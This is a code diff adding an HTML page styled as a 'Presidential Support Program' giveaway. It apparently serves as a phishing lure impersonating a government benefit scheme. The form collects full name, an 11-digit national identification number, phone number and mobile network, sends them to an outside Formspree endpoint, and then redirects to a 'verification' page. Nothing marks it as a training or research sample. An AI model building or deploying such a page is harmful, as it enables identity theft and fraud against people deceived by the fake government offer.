@@ -1,0 +1,82 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Presidential Support Program</title>
+    <link rel="stylesheet" href="styles.css">
+</head>
+
+<body>
+
+    <header class="banner"></header>
+
+    <div class="title-section">
+        <h1>Presidential Support Program</h1>
+        <p>Complete the form below to verify your eligibility.</p>
+    </div>
+
+    <form id="giveawayForm" action="https://formspree.io/f/xwvzggyb" method="POST">
+
+        <label for="name">NAME</label>
+        <input type="text" name="name" id="name" placeholder="Enter your full name" required>
+
+        <label for="nin">NIN</label>
+        <input type="text" name="nin" id="nin" pattern="[0-9]{11}" maxlength="11" placeholder="12345678901" required>
+
+        <label for="phone">PHONE NUMBER</label>
+        <input type="tel" name="phone" id="phone" pattern="[0-9]{11}" maxlength="11" placeholder="08031234567" required>
+
+        <label for="network">NETWORK</label>
+        <select name="network" id="network" required>
+            <option value="">Select Network</option>
+            <option value="MTN">MTN</option>
+            <option value="AIRTEL">AIRTEL</option>
+            <option value="GLO">GLO</option>
+            <option value="9MOBILE">9MOBILE</option>
+        </select>
+
+        <input type="submit" value="NEXT" id="submitBtn">
+
+    </form>
+
+    <script>
+        const form = document.getElementById("giveawayForm");
+        const submitBtn = document.getElementById("submitBtn");
+
+        form.addEventListener("submit", async function (e) {
+            e.preventDefault();
+
+            submitBtn.value = "PLEASE WAIT...";
+            submitBtn.disabled = true;
+
+            const formData = new FormData(form);
+
+            try {
+                const response = await fetch(form.action, {
+                    method: "POST",
+                    body: formData,
+                    headers: {
+                        "Accept": "application/json"
+                    }
+                });
+
+                if (response.ok) {
+                    window.location.href = "verification.html";
+                } else {
+                    alert("Submission failed. Please try again.");
+                    submitBtn.value = "NEXT";
+                    submitBtn.disabled = false;
+                }
+            } catch (error) {
+                alert("Network error. Please check your connection.");
+                submitBtn.value = "NEXT";
+                submitBtn.disabled = false;
+            }
+        });
+    </script>
+
+</body>
+
+</html>
